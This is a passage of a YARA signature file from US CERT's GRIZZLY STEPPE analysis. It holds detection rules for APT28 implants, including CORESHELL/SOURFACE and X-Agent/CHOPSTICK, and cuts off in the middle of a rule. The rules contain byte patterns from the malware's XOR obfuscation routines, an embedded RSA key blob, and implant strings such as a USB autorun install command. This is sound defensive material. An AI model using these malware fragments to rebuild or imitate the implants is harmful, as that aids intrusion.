[2-4] e8 [2] FF FF [6-8]\n         48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v3\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {C1 EB 07 8D ?? 01 32 1C ?? 33 D2 }\n        $STR2 = {2B ?? 83 ?? 06 0F 83 ?? 00 00 00 EB 02 33 }\n        $STR3 = {89 ?? ?? 89 ?? ?? 89 55 ?? 89 45 ?? 3B ?? 0F 83 ?? 00 00 00 8D\n         ?? ?? 8D ?? ?? FE }\n\n    condition:\n        (uint16(0) == 0x5A4D) and any of them\n}\n\nrule APT28_IMPLANT_2_v4\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53\n         56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68\n         [4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v5\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00 33\n         C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15 ?? 00\n         00 00 48 8B CC E8}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v6\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { e8 [2] ff ff 8b [0-6] 00 04 00 00 7F ?? [1-2] 00 02 00 00 7F\n         ?? [1-2] 00 01 00 00 7F ?? [1-2] 80 00 00 00 7F ?? 83 ?? 40 7F}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v7\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = {10 A0 FA FD 83 3D 28 D4 1F FF 77 5? ?8 B4 50 CC 1E B0 78 D7 90 13\n         21 C0 23 3D 28 BC 78 95 DE 4B B0 60 00 00 0F 7F 38 B4 50 C8 D5 9F E0\n         25 DF F3 21 C0 28 BC 13 3D 2B 90 60 00 00 0F 7F 18 B4 50 C8 BC F2 21\n         C0 28 B4 5E 48 B5 5E 00 8D 41 FE 83 F8 06 8B 45 ?? 72 ?? 8B 4D ?? 8B }\n        $s2 = {28 D9 B0 00 00 00 00 FB 65 C0 AF E8 D3 40 28 B4 5? ?0 3C 20 FA FD\n         88 D7 A0 18 D4 2F F3 3D 2F 77 5? ?C 1E B0 78 BC 73 21 C0 A3 3D 2B 90\n         60 00 00 0F 7F 18 A4 D? ?8 B4 50 C8 0E 90 20 24 D? ?3 20 C0 28 B4 5?\n         ?3 3D 2F 77 5? ?8 B4 50 C2 20 C0 28 BD 70 2D 93 01 E8 B4 D0 C8 D4 2F\n         E3 B4 5E 88 B4 5? ?8 95 5? ?7 2A 05 F5 E5 B8 BE 55 DC 20 80 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and any of them\n}\n\nrule APT28_IMPLANT_2_v8\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v8\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89\n         74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D\n         04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76\n         4C 89 6C 24 }\n        $STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D\n         04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7\n         E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48\n         FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }\n        $STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04\n         1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1\n         C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }\n        $STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03\n         C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and any of them\n}\n\nrule APT28_IMPLANT_2_v9\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v9\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 8A C3 02 C0 02 D8 8B 45 F8 02 DB 83 C1 02 03 45 08 88 5D 0F 89\n         45 E8 8B FF 0F B6 5C 0E FE 8B 45 F8 03 C1 0F AF D8 8D 51 01 89 55 F4\n         33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B 45 F4 C1 EB 07 32 1C 32 33 D2\n         F7 F7 8A C1 02 45 0F 2C 02 32 04 32 33 D2 88 45 FF 8B C1 8B F7 F7 F6\n         8A 45 FF 8B 75 14 22 04 32 02 D8 8B 45 E8 30 1C 08 8B 4D F4 8D 51 FE\n         3B D7 72 A4 8B 45 E4 8B 7D E0 8B 5D F0 83 45 F8 06 43 89 5D F0 3B D8\n         0F 82 ?? ?? ?? ?? 3B DF 75 13 8D 04 7F 8B 7D 10 03 C0 2B F8 EB 09 33\n         C9 E9 5B FF FF FF 33 FF 3B 7D EC 0F 83 ?? ?? ?? ?? 8B 55 08 8A CB 02\n         C9 8D 04 19 02 C0 88 45 13 8D 04 5B 03 C0 8D 54 10 FE 89 45 E0 8D 4F\n         02 89 55 E4 EB 09 8D 9B 00 00 00 00 8B 45 E0 0F B6 5C 31 FE 8D 44 01\n         FE 0F AF D8 8D 51 01 89 55 0C 33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B\n         45 0C C1 EB 07 32 1C 32 33 D2 F7 F7 8A C1 02 45 13 2C 02 32 04 32 33\n         D2 88 45 0B 8B C1 8B F7 F7 F6 8A 45 0B 8B 75 14 22 04 32 02 D8 8B 45\n         E4 30 1C 01 8B 4D 0C }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_2_v10\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v10\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF [6-8]\n         48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v11\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v11\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53\n         56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68\n         [4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v12\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v12\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00\n         33 C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15\n         ?? 00 00 00 48 8B CC E8}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v13\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v13\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF\n         [6-8] 48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v14\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v14\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89\n         74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D\n         04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76\n         4C 89 6C 24  }\n        $STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D\n         04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7\n         E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48\n         FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }\n        $STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04\n         1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1\n         C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }\n        $STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03\n         C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and any of them\n}\n\nrule APT28_IMPLANT_2_v15\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v15\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $XOR_LOOP1 = { 32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 }\n        $XOR_LOOP2 = { 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 }\n        $XOR_LOOP3 = { 02 C3 30 06 8B 5D F0 8D 41 FE 83 F8 06 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_2_v16\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v16\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $OBF_FUNCT = { 0F B6 1C 0B 8D 34 08 8D 04 0A 0F AF D8 33 D2 8D 41 FF F7\n         75 F8 8B 45 0C C1 EB 07 8D 79 01 32 1C 02 33 D2 8B C7 89 5D E4 BB 06\n         00 00 00 F7 F3 8B 45 0C 8D 59 FE 02 5D FF 32 1C 02 8B C1 33 D2 B9 06\n         00 00 00 F7 F1 8B 45 0C 8B CF 22 1C 02 8B 45 E4 8B 55 E0 02 C3 30 06\n         8B 5D F0 8D 41 FE 83 F8 06 8B 45 DC 72 9A }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $OBF_FUNCT\n}\n\nrule APT28_IMPLANT_2_v17\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v17\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 24108b44241c894424148b4424246836 }\n        $STR2 = { 518d4ddc516a018bd08b4de4e8360400 }\n        $STR3 = { e48178061591df75740433f6eb1a8b48 }\n        $STR4 = { 33d2f775f88b45d402d903c641321c3a }\n        $STR5 = { 006a0056ffd083f8ff74646a008d45f8 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and 2 of them\n}\n\nrule APT28_IMPLANT_2_v18\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v18\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 8A C1 02 C0 8D 1C 08 8B 45 F8 02 DB 8D 4A 02 8B 55 0C 88 5D FF\n         8B 5D EC 83 C2 FE 03 D8 89 55 E0 89 5D DC 8D 49 00 03 C1 8D 34 0B 0F\n         B6 1C 0A 0F AF D8 33 D2 8D 41 FF F7 75 F4 8B 45 0C C1 EB 07 8D 79 01\n         32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 8B 45 0C 8D 59 FE\n         02 5D FF 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B 45 0C 8B CF 22\n         1C 02 8B 45 E4 8B 55 E0 02 C3 30 06 8B 5D DC 8D 41 FE 83 F8 06 8B 45\n         F8 72 9B 8B 4D F0 8B 5D D8 8B 7D 08 8B F0 41 83 C6 06 89 4D F0 89 75\n         F8 3B 4D D4 0F 82 ?? ?? ?? ?? 8B 55 E8 3B CB 75 09 8D 04 5B 03 C0 2B\n         F8 EB 02 33 FF 3B FA 0F 83 ?? ?? ?? ?? 8B 5D EC 8A C1 02 C0 83 C3 FE\n         8D 14 08 8D 04 49 02 D2 03 C0 88 55 0B 8D 48 FE 8D 57 02 03 C3 89 4D\n         D4 8B 4D 0C 89 55 F8 89 45 D8 EB 06 8D 9B 00 00 00 00 0F B6 5C 0A FE\n         8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42 FF 33 D2 F7 75 F4 C1\n         EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1 8A 4D F8 8B 45 0C 80\n         E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4 8B 45 0C 22 0C 02 8B\n         D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_2_v19\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v19\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $obfuscated_RSA1 = { 7C 41 B4 DB ED B0 B8 47 F1 9C A1 49 B6 57 A6 CC D6\n         74 B5 52 12 4D FC B1 B6 3B 85 73 DF AB 74 C9 25 D8 3C EA AE 8F 5E D2\n         E3 7B 1E B8 09 3C AF 76 A1 38 56 76 BB A0 63 B6 9E 5D 86 E4 EC B0 DC\n         89 1E FA 4A E5 79 81 3F DB 56 63 1B 08 0C BF DC FC 75 19 3E 1F B3 EE\n         9D 4C 17 8B 16 9D 99 C3 0C 89 06 BB F1 72 46 7E F4 0B F6 CB B9 C2 11\n         BE 5E 27 94 5D 6D C0 9A 28 F2 2F FB EE 8D 82 C7 0F 58 51 03 BF 6A 8D\n         CD 99 F8 04 D6 F7 F7 88 0E 51 88 B4 E1 A9 A4 3B }\n        $cleartext_RSA1 = { 06 02 00 00 00 A4 00 00 52 53 41 31 00 04 00 00 01\n         00 01 00 AF BD 26 C9 04 65 45 9F 0E 3F C4 A8 9A 18 C8 92 00 B2 CC 6E\n         0F 2F B2 71 90 FC 70 2E 0A F0 CA AA 5D F4 CA 7A 75 8D 5F 9C 4B 67 32\n         45 CE 6E 2F 16 3C F1 8C 42 35 9C 53 64 A7 4A BD FA 32 99 90 E6 AC EC\n         C7 30 B2 9E 0B 90 F8 B2 94 90 1D 52 B5 2F F9 8B E2 E6 C5 9A 0A 1B 05\n         42 68 6A 3E 88 7F 38 97 49 5F F6 EB ED 9D EF 63 FA 56 56 0C 7E ED 14\n         81 3A 1D B9 A8 02 BD 3A E6 E0 FA 4D A9 07 5B E6 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}\n\nrule APT28_IMPLANT_2_v20\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v20\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $func = { 0F B6 5C 0A FE 8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42\n         FF 33 D2 F7 75 F4 C1 EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1\n         8A 4D F8 8B 45 0C 80 E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4\n         8B 45 0C 22 0C 02 8B D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 8B 45\n         D8 89 55 F8 72 A0 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_3_v1\n{\n    meta:\n        description = \"X-Agent/CHOPSTICK Implant by APT28\"\n        threat_names = \"X-Agent/CHOPSTICK, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_3_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = \">process isn't exist<\" ascii wide\n        $STR2 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" ascii wide\n        $STR3 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0\" ascii wide\n        $STR4 = \"webhp?rel=psy&hl=7&ai=\" ascii wide\n        $STR5 = {0f b6 14 31 88 55 ?? 33 d2 8b c1 f7 75 ?? 8b 45 ?? 41 0f b6 14\n         02 8a 45 ?? 03 fa}\n\n    condition:\n        any of them\n}\n\nrule APT28_IMPLANT_3_v2\n{\n    meta:\n        description = \"X-Agent/CHOPSTICK Implant by APT28\"\n        threat_names = \"X-Agent/CHOPSTICK, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_3_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $base_key_moved = {C7 45 ?? 3B C6 73 0F C7 45 ?? 8B 07 85 C0 C7 45 ?? 74\n         02 FF D0 C7 45 ?? 83 C7 04 3B C7 45 ?? FE 72 F1 5F C7 45 ?? 5E C3 8B\n         FF C7 45 ?? 56 B8 D8 78 C7 45 ?? 75 07 50 E8 C7 45 ?? B1 D1 FF FF C7\n         45 ?? 59 5D C3 8B C7 45 ?? FF 55 8B EC C7 45 ?? 83 EC 10 A1 66 C7 45\n         ?? 33 35}\n        $base_key_b_array = {3B C6 73 0F 8B 07 85 C0 74 02 FF D0 83 C7 04 3B FE\n         72 F1 5F 5E C3 8B FF 56 B8 D8 78 75 07 50 E8 B1 D1 FF FF 59 5D C3 8B\n         FF 55 8B EC 83 EC 10 A1 33 35 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}\n\nrule APT28_IMPLANT_3_v3\n{\n    meta:\n        description = \"X-Agent/CHOPSTICK Implant by APT28\"\n        threat_names = \"X-Agent/CHOPSTICK, APT28\"\n        ref = 